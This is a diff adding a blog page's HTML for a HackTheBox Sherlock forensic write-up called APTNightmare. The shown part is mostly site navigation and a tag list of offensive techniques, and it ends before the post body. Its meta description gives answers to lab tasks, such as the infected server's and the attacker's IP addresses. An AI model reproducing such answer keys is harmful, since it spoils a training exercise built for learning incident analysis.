@@ -1,0 +1,607 @@
+<!DOCTYPE html>
+
+
+<html theme="dark" showBanner="true" hasBanner="desktop" > 
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
+<script src="/js/color.global.min.js" ></script>
+<script src="/js/load-settings.js" ></script>
+<head>
+  <meta charset="utf-8">
+  
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-84TPQBH5EH"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-84TPQBH5EH');
+</script>
+<!-- End Google Analytics -->
+
+  
+  
+
+  
+  <title>【Sherlocks】APTNightmare | ❀言わぬが花❀</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
+  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">
+
+  <meta name="description" content="Task 1What is the IP address of the infected web server?直接找nmap相关流量，然后追一个包。   192.168.1.3  Task 2What is the IP address of the Attacker?同Task1   192.168.1.5  Task 3How many open ports were discovered">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【Sherlocks】APTNightmare">
+<meta property="og:url" content="http://example.com/2025/02/27/Sherlocks-APTNightmare/index.html">
+<meta property="og:site_name" content="❀言わぬが花❀">
+<meta property="og:description" content="Task 1What is the IP address of the infected web server?直接找nmap相关流量，然后追一个包。   192.168.1.3  Task 2What is the IP address of the Attacker?同Task1   192.168.1.5  Task 3How many open ports were discovered">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/wpimages/2025/Sherlocks/APTNightmare/background.jpg">
+<meta property="article:published_time" content="2025-02-27T07:08:03.000Z">
+<meta property="article:modified_time" content="2025-02-28T12:48:52.198Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="pfishing">
+<meta property="article:tag" content="beacon">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/wpimages/2025/Sherlocks/APTNightmare/background.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="❀言わぬが花❀" type="application/atom+xml">
+  
+  
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body>
+  
+  
+    
+<div id="banner" class="">
+  <img src="/images/backgroup.jpg" itemprop="image">
+  <div id="banner-dim"></div>
+</div>
+ 
+   
+  <div id="main-grid" class="  ">
+    <div id="nav" class=""  >
+      <navbar id="navbar">
+  <nav id="title-nav">
+    <a href="/">
+      <div id="vivia-logo">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+      <div>❀言わぬが花❀ </div>
+    </a>
+  </nav>
+  <nav id="main-nav">
+    
+      <a class="main-nav-link" href="/">Home</a>
+    
+      <a class="main-nav-link" href="/about">About</a>
+    
+  </nav>
+  <nav id="sub-nav">
+    <a id="theme-btn" class="nav-icon">
+      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
+      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
+    </a>
+    
+      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
+        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
+      </a>
+    
+    <div id="nav-menu-btn" class="nav-icon">
+      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
+    </div>
+  </nav>
+</navbar>
+<div id="nav-dropdown" class="hidden">
+  <div id="dropdown-link-list">
+    
+      <a class="nav-dropdown-link" href="/">Home</a>
+    
+      <a class="nav-dropdown-link" href="/about">About</a>
+    
+    
+      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
+     
+    </div>
+</div>
+<script>
+  let dropdownBtn = document.getElementById("nav-menu-btn");
+  let dropdownEle = document.getElementById("nav-dropdown");
+  dropdownBtn.onclick = function() {
+    dropdownEle.classList.toggle("hidden");
+  }
+</script>
+    </div>
+    <div id="sidebar-wrapper">
+      <sidebar id="sidebar">
+  
+    <div class="widget-wrap">
+  <div class="info-card">
+    <div class="avatar">
+      
+        <image src=/images/avatar.jpg></image>
+      
+      <div class="img-dim"></div>
+    </div>
+    <div class="info">
+      <div class="username">Flower </div>
+      <div class="dot"></div>
+      <div class="subtitle">Hi Im Flower </div>
+      <div class="link-list">
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com" title="GitHub"><i class="fa-brands fa-github"></i></a>
+         
+      </div>  
+    </div>
+  </div>
+</div>
+
+  
+    
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Tags</h3>
+      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/2FA/" rel="tag">2FA</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AD/" rel="tag">AD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AS-REQ-ST/" rel="tag">AS-REQ ST</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AllowedtoAct/" rel="tag">AllowedtoAct</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/C/" rel="tag">C#</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/C/" rel="tag">C++</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-36467/" rel="tag">CVE-2024-36467</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-42327/" rel="tag">CVE-2024-42327</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Command-injection/" rel="tag">Command injection</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DACL/" rel="tag">DACL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DLL/" rel="tag">DLL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ESC1/" rel="tag">ESC1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ESC4/" rel="tag">ESC4</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ForceChangePassword/" rel="tag">ForceChangePassword</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Forensic/" rel="tag">Forensic</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GMSA/" rel="tag">GMSA</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GSSAPI/" rel="tag">GSSAPI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GenericAll/" rel="tag">GenericAll</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Jenkins/" rel="tag">Jenkins</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/LFR/" rel="tag">LFR</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/NTHASH/" rel="tag">NTHASH</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Nmap/" rel="tag">Nmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PKINIT/" rel="tag">PKINIT</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PSReadLine/" rel="tag">PSReadLine</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PasstheCert/" rel="tag">PasstheCert</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PetitPotam/" rel="tag">PetitPotam</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Pseudorandom/" rel="tag">Pseudorandom</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Roundcube-Webmail/" rel="tag">Roundcube Webmail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Rubeus/" rel="tag">Rubeus</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SPN/" rel="tag">SPN</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SQL-injection/" rel="tag">SQL injection</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SeBackupPrivilege/" rel="tag">SeBackupPrivilege</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SeImpersonatePrivilege/" rel="tag">SeImpersonatePrivilege</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Server-Operators/" rel="tag">Server Operators</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SharPy/" rel="tag">SharPy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Shellcode/" rel="tag">Shellcode</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/TOTP/" rel="tag">TOTP</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Tips/" rel="tag">Tips</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/WriteOwner/" rel="tag">WriteOwner</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Zabbix/" rel="tag">Zabbix</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ansible-vault/" rel="tag">ansible_vault</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/asp/" rel="tag">asp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/aws/" rel="tag">aws</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azure-devops/" rel="tag">azure devops</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azureAD/" rel="tag">azureAD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/beacon/" rel="tag">beacon</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/blockchain/" rel="tag">blockchain</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bookstack/" rel="tag">bookstack</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/browser/" rel="tag">browser</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/brute-rid/" rel="tag">brute-rid</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bypass-AMSI/" rel="tag">bypass AMSI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bypass-kerberos-only/" rel="tag">bypass-kerberos-only</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/c/" rel="tag">c</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cd/" rel="tag">cd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cme/" rel="tag">cme</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/consul/" rel="tag">consul</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/deb/" rel="tag">deb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/defaultapppool/" rel="tag">defaultapppool</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnsadmin/" rel="tag">dnsadmin</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnschef/" rel="tag">dnschef</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnstools/" rel="tag">dnstools</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dpapi/" rel="tag">dpapi</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/edge/" rel="tag">edge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/efspotato/" rel="tag">efspotato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/esc1/" rel="tag">esc1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/firewall/" rel="tag">firewall</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fishing/" rel="tag">fishing</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gamepwn/" rel="tag">gamepwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ghost/" rel="tag">ghost</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/go/" rel="tag">go</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gpo/" rel="tag">gpo</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/h2/" rel="tag">h2</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/hardhat/" rel="tag">hardhat</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/havoc/" rel="tag">havoc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/impacket-GetUserSPNs/" rel="tag">impacket-GetUserSPNs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/impacket-smbclient/" rel="tag">impacket-smbclient</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/iptables/" rel="tag">iptables</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/iptables-save/" rel="tag">iptables-save</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/jwt/" rel="tag">jwt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/k8s/" rel="tag">k8s</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/kcd/" rel="tag">kcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/krbrelayx/" rel="tag">krbrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/laps/" rel="tag">laps</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ldap/" rel="tag">ldap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ldaps/" rel="tag">ldaps</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/limesurvey/" rel="tag">limesurvey</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/logon-script/" rel="tag">logon script</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mail/" rel="tag">mail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/merge/" rel="tag">merge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/msDS-KeyCredentialLink/" rel="tag">msDS-KeyCredentialLink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mssql/" rel="tag">mssql</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nginx/" rel="tag">nginx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/no-preAuth/" rel="tag">no-preAuth</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nodejs/" rel="tag">nodejs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ntlmrelayx/" rel="tag">ntlmrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pfishing/" rel="tag">pfishing</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pfx/" rel="tag">pfx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/poc/" rel="tag">poc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pod/" rel="tag">pod</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pods/" rel="tag">pods</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/postgresql/" rel="tag">postgresql</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/powershell/" rel="tag">powershell</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/powerview/" rel="tag">powerview</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pre2k/" rel="tag">pre2k</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/psexec/" rel="tag">psexec</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rbcd/" rel="tag">rbcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/remote-potato/" rel="tag">remote-potato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rootkit/" rel="tag">rootkit</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rosating/" rel="tag">rosating</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/runascs/" rel="tag">runascs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/s3/" rel="tag">s3</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sercerts/" rel="tag">sercerts</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sherlocks/" rel="tag">sherlocks</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/shm/" rel="tag">shm</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sliver-ticketer/" rel="tag">sliver ticketer</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smb/" rel="tag">smb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smb-krbrelayx/" rel="tag">smb_krbrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smbmap/" rel="tag">smbmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sqlcmd/" rel="tag">sqlcmd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sssd/" rel="tag">sssd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ssti/" rel="tag">ssti</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/study/" rel="tag">study</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/svn/" rel="tag">svn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/symlink/" rel="tag">symlink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/teampass/" rel="tag">teampass</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/tgt/" rel="tag">tgt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/username-anarchy/" rel="tag">username-anarchy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/websocket/" rel="tag">websocket</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/winlogon/" rel="tag">winlogon</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ysoserial-net/" rel="tag">ysoserial.net</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/zip/" rel="tag">zip</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E5%AE%9E%E4%BE%8B%E8%AE%B0%E5%BD%95/" rel="tag">实例记录</a></li></ul>
+    </div>
+  </div>
+
+
+  
+  <div class="sticky">
+    
+      
+
+
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Categories</h3>
+      <div class="category-box">
+            <a class="category-link" href="/categories/cloud/">
+                cloud
+                <div class="category-count">7</div>
+            </a>
+        
+            <a class="category-link" href="/categories/htb-Season-5/">
+                htb-Season-5
+                <div class="category-count">7</div>
+            </a>
+        
+            <a class="category-link" href="/categories/htb-Season-6/">
+                htb-Season-6
+                <div class="category-count">10</div>
+            </a>
+        
+            <a class="category-link" href="/categories/htb-Season-4/">
+                htb-Season-4
+                <div class="category-count">3</div>
+            </a>
+        
+            <a class="category-link" href="/categories/ctf/">
+                ctf
+                <div class="category-count">8</div>
+            </a>
+        
+            <a class="category-link" href="/categories/Sherlocks/">
+                Sherlocks
+                <div class="category-count">1</div>
+            </a>
+        
+            <a class="category-link" href="/categories/AD/">
+                AD
+                <div class="category-count">10</div>
+            </a>
+        
+            <a class="category-link" href="/categories/CVE/">
+                CVE
+                <div class="category-count">1</div>
+            </a>
+        
+            <a class="category-link" href="/categories/forensic/">
+                forensic
+                <div class="category-count">3</div>
+            </a>
+        
+            <a class="category-link" href="/categories/htb-Season-7/">
+                htb-Season-7
+                <div class="category-count">4</div>
+            </a>
+        </div>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Recent Posts</h3>
+      <ul>
+        
+          <a class="recent-link" href="/2025/02/27/Sherlocks-APTNightmare/" title="【Sherlocks】APTNightmare" >
+            <div class="recent-link-text">
+              【Sherlocks】APTNightmare
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2025/02/26/box-wp-Checker/" title="【season-7】 htb Checker wp" >
+            <div class="recent-link-text">
+              【season-7】 htb Checker wp
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2025/02/21/box-wp-Darkcorp/" title="【season-7】 htb Darkcorp wp" >
+            <div class="recent-link-text">
+              【season-7】 htb Darkcorp wp
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2025/01/31/ctf-Window-s-Infinity-Edge/" title="htb—ctf-Forensic/Window's_Infinity_Edge" >
+            <div class="recent-link-text">
+              htb—ctf-Forensic/Window&#39;s_Infinity_Edge
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2025/01/23/box-wp-Backfire/" title="【season-7】htb wp Backfire" >
+            <div class="recent-link-text">
+              【season-7】htb wp Backfire
+            </div>
+          </a>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+  </div>
+</sidebar>
+    </div>
+    <div id="content-body">
+       
+
+
+<article id="post-Sherlocks-APTNightmare" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  
+    
+<div class="article-gallery">
+  <div class="article-gallery-photos">
+    
+      <a class="article-gallery-img" rel="gallery_cm7ort3mj0000isky25yx4yav">
